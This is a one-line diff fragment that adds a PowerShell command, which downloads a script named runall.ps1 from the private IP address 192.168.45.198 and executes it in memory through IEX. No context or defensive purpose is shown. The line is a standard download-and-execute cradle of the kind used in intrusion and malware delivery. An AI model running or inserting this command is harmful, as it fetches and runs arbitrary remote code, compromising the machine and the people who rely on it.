@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.198/runall.ps1')
